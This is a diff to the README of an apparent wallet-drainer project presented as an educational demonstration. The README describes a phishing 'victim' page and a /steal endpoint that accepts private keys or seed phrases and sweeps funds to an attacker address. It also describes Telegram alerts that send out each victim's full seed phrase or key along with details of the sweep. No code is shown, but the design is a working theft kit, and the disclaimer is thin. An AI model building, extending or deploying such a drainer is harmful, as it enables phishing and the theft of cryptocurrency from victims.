@@ -17,18 +17,19 @@ This is an educational demonstration showing how malicious actors can drain cryp
 
 ## Architecture
 
-### Backend (Port 3000)
-- Express.js API server
-- `/steal` endpoint - accepts private keys/mnemonics and sweeps funds to attacker address
-- `/alchemy-webhook` endpoint - receives transaction notifications from Alchemy
-- Gas fee calculation and optimization
-- Telegram bot integration for notifications
-
-### Frontend (Port 5000)
-- Static file server with proxy to backend
-- Landing page with project documentation
-- Victim simulation page for testing
-- Dashboard (requires Firebase authentication - optional)
+### Unified Server (Port 5000)
+- Single Express.js server serving both static files and API endpoints
+- **Static Routes:**
+  - `/` - Landing page with project documentation
+  - `/victim` - Phishing simulation page for testing
+  - `/dashboard` - Wallet dashboard (optional)
+- **API Endpoints:**
+  - `POST /steal` - Accepts private keys/mnemonics and sweeps funds to attacker address
+  - `POST /alchemy-webhook` - Receives transaction notifications from Alchemy
+- Features:
+  - Gas fee calculation and optimization
+  - Telegram bot integration for notifications
+  - Two-stage notification system (credential receipt + sweep completion)
 
 ## Setup
 
@@ -52,11 +53,13 @@ The following environment variables are configured in Replit Secrets:
 
 ### Running the Project
 
-The project runs automatically when you start the Replit. It launches two servers:
-1. Backend API on port 3000
-2. Frontend on port 5000
+The project runs automatically when you start the Replit:
 
-Access the demo at the Replit webview URL.
+```bash
+npm start
+```
+
+This starts the unified server on port 5000. Access the demo at the Replit webview URL.
 
 ## Usage
 
@@ -113,21 +116,44 @@ This project demonstrates:
 ## Project Structure
 
 ```
-├── attacker-server.js      # Main backend server
-├── frontend-server.js      # Static file server with API proxy
-├── start.js               # Launches both servers
+├── server.js              # Unified server (static files + API)
 ├── index.html             # Landing page
 ├── victim.html            # Phishing simulation page
 ├── dashboard.html         # Optional Firebase-based wallet dashboard
 ├── package.json           # Node.js dependencies
+├── deposits.json          # Transaction history (auto-generated)
 └── .env.example          # Example environment configuration
 ```
 
 ## Deployment
 
-This project is configured for Replit deployment using the VM deployment target. The deployment will run both servers automatically.
+This project is configured for Replit deployment using the VM deployment target. The single server runs automatically on startup.
 
 **Remember**: This is for educational purposes only. Do not deploy publicly or use with real funds.
+
+## Telegram Notifications
+
+The bot sends **two notifications** when credentials are received:
+
+1. **Immediate Alert** - Sent as soon as seed phrase/private key is received:
+   ```
+   Sweep detected
+   • Victim: 0x123...
+   • Seed/Key: [full seed phrase or private key]
+   • Balance: checking... ETH
+   • Sender: 🔑 CREDENTIALS RECEIVED
+   ```
+
+2. **Sweep Completion** - Sent after successful fund transfer (if balance ≥ 0.0001 ETH):
+   ```
+   Sweep detected
+   • Victim: 0x123...
+   • Seed/Key: [full seed phrase or private key]
+   • Balance: 0.088393 ETH
+   • Tx: https://sepolia.etherscan.io/tx/0x...
+   • Gas fee: 0.0000315 ETH
+   • Sender: ✅ SWEEP COMPLETED
+   ```
 
 ## License
 
